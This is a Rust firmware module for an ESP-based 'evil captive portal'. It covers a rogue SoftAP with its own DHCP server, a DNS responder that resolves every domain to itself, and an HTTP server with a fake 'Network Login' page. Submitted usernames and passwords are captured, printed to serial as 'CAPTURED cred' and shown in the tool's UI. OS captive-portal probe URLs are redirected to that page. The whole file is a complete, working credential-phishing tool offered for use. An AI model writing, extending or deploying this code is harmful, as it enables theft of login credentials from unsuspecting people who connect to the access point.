//! Evil / captive portal — a SoftAP that hands every client an IP (DHCP),
//! resolves every domain to itself (DNS), and serves a credential-harvesting
//! login page over HTTP. Captured creds are printed to serial and surfaced to
//! the UI.
//!
//! Built on `smoltcp` (no_std, no-alloc): we adapt esp-radio's raw SoftAP frame
//! tokens into a `smoltcp::phy::Device`, then run a synchronous poll loop with
//! three hand-rolled servers (smoltcp ships DHCP/DNS *clients*, not servers):
//!   * UDP :67  DHCP  — OFFER/ACK a fixed lease, gateway+DNS = us
//!   * UDP :53  DNS   — answer every A query with our IP (captures all domains)
//!   * TCP :80  HTTP  — login form; POST creds are captured; probe URLs 302 home
//!
//! `radio.rs` owns the WiFi peripheral and brings the AP up; this module borrows
//! the access-point `Interface` and owns the TCP/IP stack for the tool's lifetime.

use esp_radio::wifi::{Interface as WifiIface, WifiRxToken, WifiTxToken};
use esp_println::println;
use smoltcp::iface::{Config, Interface, SocketSet, SocketStorage};
use smoltcp::phy::{self, Device, DeviceCapabilities, Medium};
use smoltcp::socket::{tcp, udp};
use smoltcp::time::Instant as SmolInstant;
use smoltcp::wire::{
    EthernetAddress, HardwareAddress, IpAddress, IpCidr, IpEndpoint, IpListenEndpoint, Ipv4Address,
};

use esp_hal::time::{Duration, Instant};

/// Gateway / portal IP. Every DNS answer + the DHCP router/DNS option point here.
const GW: [u8; 4] = [192, 168, 4, 1];
/// Base address we lease to clients; dhcp_build varies the last octet per client.
const LEASE: [u8; 4] = [192, 168, 4, 100];
/// Ethernet frame MTU we advertise to smoltcp. MUST NOT exceed esp-radio's own
/// WIFI MTU (default 1492, ESP_RADIO_CONFIG_WIFI_MTU): its TX path copies the frame
/// into a fixed `[u8; MTU]` and slices `[..len]`, so a larger frame panics with a
/// slice-index error mid-send (hit the moment a full-size TCP segment goes out).
const MTU: usize = 1492;

fn gw_ip() -> Ipv4Address {
    Ipv4Address::new(GW[0], GW[1], GW[2], GW[3])
}

// ----------------------- live stats (shown by main) -----------------------

#[derive(Clone)]
pub struct Stats {
    pub dhcp: u32,
    pub dns: u32,
    pub http: u32,
    pub creds: u32,
    pub user: [u8; 48],
    pub user_len: usize,
    pub pass: [u8; 48],
    pub pass_len: usize,
}
impl Stats {
    pub fn new() -> Self {
        Self { dhcp: 0, dns: 0, http: 0, creds: 0, user: [0; 48], user_len: 0, pass: [0; 48], pass_len: 0 }
    }
    pub fn user_str(&self) -> &str {
        core::str::from_utf8(&self.user[..self.user_len]).unwrap_or("?")
    }
    pub fn pass_str(&self) -> &str {
        core::str::from_utf8(&self.pass[..self.pass_len]).unwrap_or("?")
    }
}

// --------------------- smoltcp phy::Device over esp-radio ---------------------
// `Interface` is `Copy` (PhantomData + a small enum), so we own it by value — no
// borrow/lifetime juggling against `iface.poll(&mut device, ...)`.

/// Shared smoltcp `phy::Device` over an esp-radio WiFi `Interface` (AP or STA).
/// `Interface` is `Copy`, so we own it by value — no borrow/lifetime juggling.
pub(crate) struct WifiPhy {
    iface: WifiIface<'static>,
}
impl WifiPhy {
    pub(crate) fn new(iface: WifiIface<'static>) -> Self {
        Self { iface }
    }
}
pub(crate) struct RxTok(WifiRxToken);
pub(crate) struct TxTok(WifiTxToken);

impl phy::RxToken for RxTok {
    fn consume<R, F: FnOnce(&[u8]) -> R>(self, f: F) -> R {
        // esp-radio yields &mut [u8]; smoltcp only needs &[u8] -> reborrow shared.
        self.0.consume_token(|buf| f(buf))
    }
}
impl phy::TxToken for TxTok {
    fn consume<R, F: FnOnce(&mut [u8]) -> R>(self, len: usize, f: F) -> R {
        self.0.consume_token(len, f)
    }
}
impl Device for WifiPhy {
    type RxToken<'a> = RxTok where Self: 'a;
    type TxToken<'a> = TxTok where Self: 'a;
    fn receive(&mut self, _t: SmolInstant) -> Option<(RxTok, TxTok)> {
        self.iface.receive().map(|(r, t)| (RxTok(r), TxTok(t)))
    }
    fn transmit(&mut self, _t: SmolInstant) -> Option<TxTok> {
        self.iface.transmit().map(TxTok)
    }
    fn capabilities(&self) -> DeviceCapabilities {
        let mut c = DeviceCapabilities::default();
        c.medium = Medium::Ethernet;
        c.max_transmission_unit = MTU;
        c
    }
}

// ================================ DHCP server ================================

const DHCP_MAGIC: [u8; 4] = [0x63, 0x82, 0x53, 0x63];

/// Parse a BOOTP/DHCP request -> (msg_type, xid, flags, chaddr). msg_type 1=DISCOVER,
/// 3=REQUEST. None if not a DHCP request we handle.
fn dhcp_parse(buf: &[u8]) -> Option<(u8, [u8; 4], [u8; 2], [u8; 16])> {
    if buf.len() < 240 || buf[0] != 1 || buf[236..240] != DHCP_MAGIC {
        return None;
    }
    let mut xid = [0u8; 4];
    xid.copy_from_slice(&buf[4..8]);
    let mut flags = [0u8; 2];
    flags.copy_from_slice(&buf[10..12]);
    let mut chaddr = [0u8; 16];
    chaddr.copy_from_slice(&buf[28..44]);
    let mut kind = 0u8;
    let mut i = 240;
    while i < buf.len() {
        let code = buf[i];
        if code == 255 {
            break; // END — reachable now even when it is the final byte
        }
        if code == 0 {
            i += 1;
            continue;
        }
        if i + 1 >= buf.len() {
            break; // malformed: option length byte is missing
        }
        let len = buf[i + 1] as usize;
        if code == 53 && len >= 1 && i + 2 < buf.len() {
            kind = buf[i + 2];
        }
        i += 2 + len;
    }
    Some((kind, xid, flags, chaddr))
}

/// Build a DHCPOFFER (type 2) / DHCPACK (type 5) into `out` (>=300 bytes). Returns len.
fn dhcp_build(out: &mut [u8], msg_type: u8, xid: [u8; 4], flags: [u8; 2], chaddr: [u8; 16]) -> usize {
    assert!(out.len() >= 300, "dhcp_build: out buffer must be >= 300 bytes");
    let hdr = 240.min(out.len());
    for b in out[..hdr].iter_mut() {
        *b = 0;
    }
    out[0] = 2; // BOOTREPLY
    out[1] = 1; // Ethernet
    out[2] = 6; // hlen
    out[4..8].copy_from_slice(&xid);
    out[10..12].copy_from_slice(&flags);
    out[16..20].copy_from_slice(&LEASE); // yiaddr (base)
    // vary the last octet per client (.100-.107) so >1 simultaneous client doesn't get the
    // same address; OFFER and ACK derive from the same chaddr, so they stay consistent.
    out[19] = LEASE[3].wrapping_add(chaddr[5] & 0x07);
    out[20..24].copy_from_slice(&GW); // siaddr
    out[28..44].copy_from_slice(&chaddr);
    out[236..240].copy_from_slice(&DHCP_MAGIC);
    let mut p = 240;
    let put = |o: &mut [u8], code: u8, data: &[u8], p: &mut usize| {
        o[*p] = code;
        o[*p + 1] = data.len() as u8;
        o[*p + 2..*p + 2 + data.len()].copy_from_slice(data);
        *p += 2 + data.len();
    };
    put(out, 53, &[msg_type], &mut p);
    put(out, 54, &GW, &mut p); // server id
    put(out, 51, &3600u32.to_be_bytes(), &mut p); // lease 1h
    put(out, 1, &[255, 255, 255, 0], &mut p); // subnet
    put(out, 3, &GW, &mut p); // router
    put(out, 6, &GW, &mut p); // DNS
    out[p] = 255;
    p += 1;
    while p < 300 {
        out[p] = 0;
        p += 1;
    }
    p
}

fn dhcp_service(sock: &mut udp::Socket, stats: &mut Stats) {
    let mut req = [0u8; 600];
    while let Ok((n, _meta)) = sock.recv_slice(&mut req) {
        if let Some((kind, xid, flags, chaddr)) = dhcp_parse(&req[..n]) {
            let reply = match kind {
                1 => 2, // DISCOVER -> OFFER
                3 => 5, // REQUEST  -> ACK
                _ => continue,
            };
            let to = IpEndpoint::new(IpAddress::v4(255, 255, 255, 255), 68);
            let _ = sock.send_with(300, to, |buf| dhcp_build(buf, reply, xid, flags, chaddr));
            stats.dhcp += 1;
        }
    }
}

// ================================ DNS responder ================================

/// Answer every A query with the gateway IP. Returns response length (0 = drop).
fn dns_build(query: &[u8], out: &mut [u8]) -> usize {
    if query.len() < 12 {
        return 0;
    }
    let qdcount = u16::from_be_bytes([query[4], query[5]]);
    if qdcount == 0 {
        return 0;
    }
    // walk the first QNAME to find the end of the question section
    let mut q = 12;
    while q < query.len() {
        let l = query[q] as usize;
        if l == 0 {
            q += 1;
            break;
        }
        q += 1 + l;
    }
    q += 4; // QTYPE + QCLASS
    if q > query.len() || q > out.len() {
        return 0;
    }
    // header: copy id, set response flags, qd=1, an=1, ns=ar=0
    out[..q].copy_from_slice(&query[..q]);
    out[2] = (query[2] & 0x01) | 0x80; // QR=1, opcode/AA/TC=0, RD mirrored from the query
    out[3] = 0x80; // RA=1, rcode=0
    out[4] = 0;
    out[5] = 1; // QDCOUNT = 1
    out[6] = 0;
    out[7] = 1; // ANCOUNT = 1
    out[8] = 0;
    out[9] = 0; // NSCOUNT
    out[10] = 0;
    out[11] = 0; // ARCOUNT
    let mut p = q;
    // answer: name pointer to the question (0xC00C), type A, class IN, TTL, RDLEN 4, IP
    let ans: [u8; 16] = [
        0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3C, 0x00, 0x04, GW[0], GW[1], GW[2], GW[3],
    ];
    if p + ans.len() > out.len() {
        return 0;
    }
    out[p..p + ans.len()].copy_from_slice(&ans);
    p += ans.len();
    p
}

fn dns_service(sock: &mut udp::Socket, stats: &mut Stats) {
    let mut q = [0u8; 768];
    while let Ok((n, meta)) = sock.recv_slice(&mut q) {
        let mut resp = [0u8; 768];
        let len = dns_build(&q[..n], &mut resp);
        if len > 0 {
            let _ = sock.send_slice(&resp[..len], meta.endpoint);
            stats.dns += 1;
        }
    }
}

// ================================ HTTP server ================================

const LOGIN_PAGE: &[u8] = b"HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\nCache-Control: no-cache\r\n\r\n\
<!doctype html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">\
<title>WiFi Login</title><style>body{font-family:sans-serif;background:#111;color:#eee;text-align:center;padding:40px}\
input{display:block;margin:12px auto;padding:10px;width:80%;max-width:300px;border-radius:6px;border:1px solid #444;background:#222;color:#eee}\
button{padding:10px 24px;border-radius:6px;border:0;background:#e8b800;font-weight:bold}</style></head>\
<body><h2>Network Login</h2><p>Sign in to access the internet.</p>\
<form method=POST action=/><input name=user placeholder=\"Email or username\">\
<input name=pass type=password placeholder=Password><button type=submit>Connect</button></form>\
</body></html>";

const DONE_PAGE: &[u8] = b"HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n\
<!doctype html><html><body style=\"font-family:sans-serif;background:#111;color:#eee;text-align:center;padding:40px\">\
<h2>Connecting...</h2><p>Please wait while we verify your credentials.</p></body></html>";

/// Redirect probe requests (OS captive detection) to the portal root.
const REDIRECT: &[u8] =
    b"HTTP/1.0 302 Found\r\nLocation: http://192.168.4.1/\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";

fn hex_nib(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// urldecode a x-www-form-urlencoded value into `out`, returning its length.
fn url_decode(src: &[u8], out: &mut [u8]) -> usize {
    let mut i = 0;
    let mut o = 0;
    while i < src.len() && o < out.len() {
        match src[i] {
            b'+' => {
                out[o] = b' ';
                i += 1;
            }
            b'%' if i + 2 < src.len() => {
                if let (Some(h), Some(l)) = (hex_nib(src[i + 1]), hex_nib(src[i + 2])) {
                    out[o] = (h << 4) | l;
                    i += 3;
                } else {
                    out[o] = src[i];
                    i += 1;
                }
            }
            c => {
                out[o] = c;
                i += 1;
            }
        }
        o += 1;
    }
    o
}

/// Find `key=value` in a urlencoded body and url-decode the value into `out`.
fn form_field(body: &[u8], key: &str, out: &mut [u8]) -> usize {
    let k = key.as_bytes();
    let mut i = 0;
    while i < body.len() {
        // start of a field
        let start = i;
        // find '='
        let mut eq = start;
        while eq < body.len() && body[eq] != b'=' && body[eq] != b'&' {
            eq += 1;
        }
        if eq < body.len() && body[eq] == b'=' && &body[start..eq] == k {
            let mut end = eq + 1;
            while end < body.len() && body[end] != b'&' {
                end += 1;
            }
            return url_decode(&body[eq + 1..end], out);
        }
        // skip to next '&'
        let mut nxt = eq;
        while nxt < body.len() && body[nxt] != b'&' {
            nxt += 1;
        }
        i = nxt + 1;
    }
    0
}

fn is_probe(path: &[u8]) -> bool {
    const PROBES: [&str; 8] = [
        "/generate_204",
        "/gen_204",
        "/hotspot-detect.html",
        "/library/test/success.html",
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect",
        "/success.txt",
    ];
    PROBES.iter().any(|p| path == p.as_bytes())
}

/// Handle one HTTP request buffer. Returns the response bytes to send.
fn http_handle(req: &[u8], stats: &mut Stats) -> &'static [u8] {
    stats.http += 1;
    // request line: METHOD SP PATH SP HTTP/x
    let line_end = req.windows(2).position(|w| w == b"\r\n").unwrap_or(req.len());
    let line = &req[..line_end];
    let is_post = line.starts_with(b"POST");
    // extract path
    let path_start = line.iter().position(|&b| b == b' ').map(|i| i + 1).unwrap_or(0);
    let rest = &line[path_start..];
    let path_end = rest.iter().position(|&b| b == b' ').unwrap_or(rest.len());
    let path = &rest[..path_end];

    if is_post {
        // body after the blank line
        if let Some(bp) = req.windows(4).position(|w| w == b"\r\n\r\n") {
            let body = &req[bp + 4..];
            let ul = form_field(body, "user", &mut stats.user);
            let pl = form_field(body, "pass", &mut stats.pass);
            if ul > 0 || pl > 0 {
                stats.user_len = ul;
                stats.pass_len = pl;
                stats.creds += 1;
                println!(
                    "[PORTAL] CAPTURED cred  user=\"{}\"  pass=\"{}\"",
                    core::str::from_utf8(&stats.user[..ul]).unwrap_or("?"),
                    core::str::from_utf8(&stats.pass[..pl]).unwrap_or("?"),
                );
            }
        }
        return DONE_PAGE;
    }
    if is_probe(path) {
        return REDIRECT;
    }
    LOGIN_PAGE
}

fn http_service(sock: &mut tcp::Socket, stats: &mut Stats) {
    // (re)arm the listener whenever the socket is idle
    if !sock.is_open() {
        let _ = sock.listen(80);
        return;
    }
    if sock.can_recv() {
        let mut buf = [0u8; 2048];
        // Drain everything currently in the RX ring before parsing: a single request can
        // arrive as several recv_slice chunks within one poll, and reading only the first
        // would miss a POST body that trails the headers. (A request still larger than this
        // buffer, or one whose body lands in a strictly later poll, is the remaining gap.)
        let mut off = 0;
        while off < buf.len() {
            match sock.recv_slice(&mut buf[off..]) {
                Ok(n) if n > 0 => off += n,
                _ => break,
            }
        }
        if off > 0 {
            let resp = http_handle(&buf[..off], stats);
            if sock.can_send() {
                let _ = sock.send_slice(resp);
            }
            sock.close();
        }
    }
    if sock.state() == tcp::State::CloseWait {
        sock.close();
    }
}

// ================================ run loop ================================

/// Drive the portal on the SoftAP `ap` interface until `tick` returns false.
/// `tick(&Stats)` is called ~every 120 ms so the caller can repaint + poll for
/// an abort key. Returns the final stats.
pub fn run(ap: WifiIface<'static>, mac: [u8; 6], mut tick: impl FnMut(&Stats) -> bool) -> Stats {
    let mut device = WifiPhy::new(ap);
    let t0 = Instant::now();
    let now = || SmolInstant::from_millis(t0.elapsed().as_millis() as i64);

    let mut cfg = Config::new(HardwareAddress::Ethernet(EthernetAddress(mac)));
    cfg.random_seed = t0.duration_since_epoch().as_micros() | 1; // nonzero TCP ISN seed
    let mut iface = Interface::new(cfg, &mut device, now());
    iface.update_ip_addrs(|a| {
        let _ = a.push(IpCidr::new(IpAddress::Ipv4(gw_ip()), 24));
    });

    // --- no-alloc socket buffers (locals) ---
    let mut dhcp_rx_meta = [udp::PacketMetadata::EMPTY; 4];
    let mut dhcp_rx = [0u8; 1024];
    let mut dhcp_tx_meta = [udp::PacketMetadata::EMPTY; 4];
    let mut dhcp_tx = [0u8; 1024];
    let mut dhcp_sock = udp::Socket::new(
        udp::PacketBuffer::new(&mut dhcp_rx_meta[..], &mut dhcp_rx[..]),
        udp::PacketBuffer::new(&mut dhcp_tx_meta[..], &mut dhcp_tx[..]),
    );
    let _ = dhcp_sock.bind(IpListenEndpoint { addr: None, port: 67 });

    let mut dns_rx_meta = [udp::PacketMetadata::EMPTY; 8];
    let mut dns_rx = [0u8; 1536];
    let mut dns_tx_meta = [udp::PacketMetadata::EMPTY; 8];
    let mut dns_tx = [0u8; 1536];
    let mut dns_sock = udp::Socket::new(
        udp::PacketBuffer::new(&mut dns_rx_meta[..], &mut dns_rx[..]),
        udp::PacketBuffer::new(&mut dns_tx_meta[..], &mut dns_tx[..]),
    );
    let _ = dns_sock.bind(IpListenEndpoint { addr: None, port: 53 });

    let mut http_rx = [0u8; 4096];
    let mut http_tx = [0u8; 4096];
    let mut http_sock = tcp::Socket::new(
        tcp::SocketBuffer::new(&mut http_rx[..]),
        tcp::SocketBuffer::new(&mut http_tx[..]),
    );
    http_sock.set_timeout(Some(smoltcp::time::Duration::from_secs(10)));

    let mut storage = [SocketStorage::EMPTY; 4];
    let mut sockets = SocketSet::new(&mut storage[..]);
    let dhcp_h = sockets.add(dhcp_sock);
    let dns_h = sockets.add(dns_sock);
    let http_h = sockets.add(http_sock);
    let _ = sockets.get_mut::<tcp::Socket>(http_h).listen(80);

    let mut stats = Stats::new();
    let mut last_tick = Instant::now();
    loop {
        iface.poll(now(), &mut device, &mut sockets);
        dhcp_service(sockets.get_mut::<udp::Socket>(dhcp_h), &mut stats);
        dns_service(sockets.get_mut::<udp::Socket>(dns_h), &mut stats);
        http_service(sockets.get_mut::<tcp::Socket>(http_h), &mut stats);

        if last_tick.elapsed() >= Duration::from_millis(120) {
            last_tick = Instant::now();
            if !tick(&stats) {
                break;
            }
        }
    }
    stats
}
